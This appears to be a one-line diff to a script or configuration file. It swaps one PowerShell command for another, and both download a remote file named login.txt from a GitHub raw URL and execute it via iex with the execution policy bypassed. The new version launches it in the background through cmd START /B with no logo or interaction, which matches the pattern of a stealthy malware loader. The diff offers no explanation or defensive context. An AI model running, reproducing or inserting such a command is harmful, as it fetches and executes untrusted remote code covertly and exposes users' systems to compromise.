@@ -1,1 +1,1 @@
-powershell -ep bypass -w hidden iex(iwr https://raw.githubusercontent.com/br1337/Scripts/main/login.txt -usebasicparsing)
+cmd.exe /c START /B powershell -ep bypass -noninteractive -nologo -c "iex(iwr https://raw.githubusercontent.com/br1337/Scripts/main/login.txt -usebasicparsing)"
